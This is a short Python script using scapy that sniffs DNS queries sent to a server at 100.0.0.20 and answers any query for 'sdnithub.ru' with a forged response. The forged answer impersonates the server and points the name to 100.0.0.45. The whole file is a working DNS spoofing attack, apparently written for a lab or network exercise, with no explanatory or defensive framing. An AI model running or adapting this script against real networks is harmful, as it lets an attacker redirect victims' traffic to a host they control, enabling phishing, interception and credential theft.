from scapy.all import *

DNSServerIP = "100.0.0.20"
filter = "udp port 53 and ip dst " + DNSServerIP + " and not ip src " + DNSServerIP
RespIP = "100.0.0.45"

def DNS_Responder(localIP):
    def getResponse(pkt):
        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != RespIP:
            if "sdnithub.ru" in pkt[DNS].qd.qname.decode():
                spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / \
                          DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, an=DNSRR(rrname="sdnithub.ru", rdata=RespIP))
                send(spfResp, verbose=0)
                return "Spoofed DNS Response Sent"
            else:
                # do nothing, since we do not forward dns here
                return False
        else:
            return False
    return getResponse

sniff(filter=filter, prn=DNS_Responder(DNSServerIP))
